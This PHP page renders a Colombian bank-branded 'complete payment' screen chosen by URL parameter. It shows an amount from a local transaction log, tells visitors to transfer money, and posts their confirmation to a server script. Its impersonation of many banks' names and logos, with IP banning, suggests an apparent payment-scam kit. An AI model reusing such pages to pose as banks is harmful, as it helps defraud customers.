<?php
session_start();
header('Content-Type: text/html; charset=UTF-8');

// Seguridad: bloquear IPs baneadas
require_once __DIR__ . '/../includes/security.php';
sura_enforce_security();

$bancosInfo = [
    'davivienda'          => ['name' => 'Banco Davivienda',        'color' => '#ed1c24'],
    'bancolombia'         => ['name' => 'Bancolombia',             'color' => '#fddb00'],
    'bogota'              => ['name' => 'Banco de Bogotá',         'color' => '#0033a0', 'logo' => '../assets/img/bogota-logo.svg'],
    'occidente'           => ['name' => 'Banco de Occidente',      'color' => '#e30613', 'logo' => '../assets/img/logo-v-banco-occidente.svg'],
    'popular'             => ['name' => 'Banco Popular',           'color' => '#005baa', 'logo' => '../assets/img/logo-v-banco-popular.png'],
    'avvillas'            => ['name' => 'Banco AV Villas',         'color' => '#d52b1e', 'logo' => '../assets/img/logo-v-banco-avvillas.svg'],
    'bbva'                => ['name' => 'BBVA Colombia',           'color' => '#004481'],
    'caja-social'         => ['name' => 'Banco Caja Social',       'color' => '#00a19a'],
    'falabella'           => ['name' => 'Banco Falabella',         'color' => '#6dc24b'],
    'finandina'           => ['name' => 'Banco Finandina',         'color' => '#003865'],
    'itau'                => ['name' => 'Banco Itaú',              'color' => '#ec7000'],
    'mundo-mujer'         => ['name' => 'Banco Mundo Mujer',       'color' => '#e6007e'],
    'serfinanza'          => ['name' => 'Banco Serfinanza',        'color' => '#00558c'],
    'lulo'                => ['name' => 'Lulo Bank',               'color' => '#ffdd00'],
    'scotiabank-colpatria'=> ['name' => 'Scotiabank Colpatria',    'color' => '#ec111a'],
    'agrario'             => ['name' => 'Banco Agrario',           'color' => '#009444'],
    'pichincha'           => ['name' => 'Banco Pichincha',         'color' => '#ffdd00'],
    'bancoomeva'          => ['name' => 'Bancoomeva',              'color' => '#00a859'],
    'nequi'               => ['name' => 'Nequi',                   'color' => '#210049'],
    'daviplata'           => ['name' => 'Daviplata',               'color' => '#ed1c24'],
    'dale'                => ['name' => 'Dale!',                   'color' => '#6f2dbd'],
    'nu'                  => ['name' => 'Nu Bank',                 'color' => '#820ad1'],
    'generico'            => ['name' => 'Tu entidad bancaria',     'color' => '#0033a0'],
];

$slug   = preg_replace('/[^a-z0-9-]/', '', strtolower($_GET['b'] ?? 'generico'));
$ticket = preg_replace('/[^A-Za-z0-9-]/', '', $_GET['t'] ?? '');
$bank   = $bancosInfo[$slug] ?? $bancosInfo['generico'];

// Buscar la transacción para mostrar monto y referencia reales
$tx = null;
$logsFile = __DIR__ . '/../transacciones_pse.json';
if ($ticket && file_exists($logsFile)) {
    $logs = json_decode(file_get_contents($logsFile), true) ?: [];
    foreach ($logs as $l) {
        if (($l['ticketId'] ?? '') === $ticket) { $tx = $l; break; }
    }
}

$monto      = $tx['monto'] ?? 0;
$servicio   = $tx['servicio'] ?? 'Pago de convenio';
$referencia = $tx['referencia'] ?? ($tx['ref'] ?? '');
$nombres    = $tx['nombres'] ?? '';
$confirmado = $tx && ($tx['status'] ?? '') === 'COMPROBANTE_REPORTADO';
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?= htmlspecialchars($bank['name']) ?> — Completar pago</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family:'Segoe UI',system-ui,sans-serif; background:#0a1128; color:#dbe4f5; min-height:100vh; display:flex; align-items:center; justify-content:center; padding:20px; }
        .card { background:#12203e; border:1px solid #1e3a6e; border-radius:16px; padding:32px 28px; width:100%; max-width:460px; box-shadow:0 12px 40px rgba(0,0,0,0.5); }
        .bank-head { display:flex; align-items:center; gap:12px; margin-bottom:20px; padding-bottom:16px; border-bottom:1px solid #1e3a6e; }
        .bank-dot { width:14px; height:14px; border-radius:50%; background:<?= htmlspecialchars($bank['color']) ?>; flex-shrink:0; }
        .bank-head img { height:30px; max-width:130px; object-fit:contain; background:#fff; border-radius:6px; padding:4px 8px; }
        .bank-head h1 { font-size:1.15rem; color:#fff; }
        .amount-box { text-align:center; background:#0d1b3e; border:1px solid #1e3a6e; border-radius:12px; padding:20px; margin-bottom:20px; }
        .amount-box .label { font-size:0.78rem; color:#7d9bd1; text-transform:uppercase; letter-spacing:1px; }
        .amount-box .value { font-size:2rem; font-weight:800; color:#00e676; margin-top:4px; }
        .detail { display:flex; justify-content:space-between; padding:9px 2px; font-size:0.86rem; border-bottom:1px solid #16294f; }
        .detail span:first-child { color:#7d9bd1; }
        .detail span:last-child { color:#fff; font-weight:600; text-align:right; max-width:60%; word-break:break-all; }
        .steps { background:#0d1b3e; border:1px solid #1e3a6e; border-radius:10px; padding:16px 18px; margin:18px 0; font-size:0.84rem; color:#c3d4f2; }
        .steps li { margin:6px 0 6px 18px; }
        .btn-confirm { width:100%; padding:14px; background:#00c853; color:#04150a; border:none; border-radius:10px; font-size:0.95rem; font-weight:800; cursor:pointer; }
        .btn-confirm:hover { background:#00e676; }
        .btn-confirm:disabled { background:#2a4a80; color:#7d9bd1; cursor:default; }
        .ok-box { text-align:center; padding:24px 10px; }
        .ok-box .icon { font-size:3rem; }
        .ok-box h2 { color:#00e676; margin:10px 0 6px; }
        .ok-box p { color:#7d9bd1; font-size:0.86rem; }
        .secure { text-align:center; margin-top:16px; font-size:0.72rem; color:#5f7cad; }
    </style>
</head>
<body>
<div class="card">
    <div class="bank-head">
        <?php if (!empty($bank['logo'])): ?>
            <img src="<?= htmlspecialchars($bank['logo']) ?>" alt="<?= htmlspecialchars($bank['name']) ?>">
        <?php else: ?>
            <span class="bank-dot"></span>
        <?php endif; ?>
        <h1><?= htmlspecialchars($bank['name']) ?></h1>
    </div>

    <?php if ($confirmado): ?>
        <div class="ok-box">
            <div class="icon">✅</div>
            <h2>Pago reportado</h2>
            <p>Esta transacción ya fue confirmada anteriormente.<br>Ticket: <?= htmlspecialchars($ticket) ?></p>
        </div>
    <?php else: ?>
        <div class="amount-box">
            <div class="label">Valor a pagar</div>
            <div class="value">$<?= number_format($monto, 0, ',', '.') ?> COP</div>
        </div>

        <div class="detail"><span>Servicio</span><span><?= htmlspecialchars($servicio) ?></span></div>
        <?php if ($referencia): ?><div class="detail"><span>Referencia</span><span><?= htmlspecialchars($referencia) ?></span></div><?php endif; ?>
        <div class="detail"><span>Ticket</span><span><?= htmlspecialchars($ticket ?: '—') ?></span></div>
        <?php if ($nombres): ?><div class="detail"><span>Titular</span><span><?= htmlspecialchars($nombres) ?></span></div><?php endif; ?>

        <ol class="steps">
            <li>Abre la app o página de <strong><?= htmlspecialchars($bank['name']) ?></strong>.</li>
            <li>Realiza el pago/transferencia por el valor indicado usando tu referencia.</li>
            <li>Guarda el comprobante y regresa aquí.</li>
            <li>Presiona <strong>"Ya realicé mi pago"</strong> para confirmar la transacción.</li>
        </ol>

        <button class="btn-confirm" id="btn-confirm" onclick="confirmarPago()">✅ Ya realicé mi pago</button>
    <?php endif; ?>

    <p class="secure">🔒 Conexión segura — No compartas tus claves bancarias en este sitio.</p>
</div>

<script>
function confirmarPago() {
    var btn = document.getElementById('btn-confirm');
    btn.disabled = true;
    btn.innerText = 'Confirmando...';
    fetch('confirmar.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ticketId: <?= json_encode($ticket) ?>, banco: <?= json_encode($slug) ?> })
    })
    .then(function(r) { return r.json(); })
    .then(function(resp) {
        if (resp && resp.ok) {
            document.querySelector('.card').innerHTML =
                '<div class="ok-box"><div class="icon">✅</div><h2>Pago reportado</h2>' +
                '<p>Tu confirmación fue registrada.<br>Ticket: <?= htmlspecialchars($ticket) ?><br>' +
                'La entidad validará tu comprobante.</p></div>';
        } else {
            btn.disabled = false;
            btn.innerText = '✅ Ya realicé mi pago';
            alert((resp && resp.message) ? resp.message : 'No se pudo confirmar. Intenta de nuevo.');
        }
    })
    .catch(function() {
        btn.disabled = false;
        btn.innerText = '✅ Ya realicé mi pago';
        alert('Error de conexión. Intenta de nuevo.');
    });
}
</script>
</body>
</html>
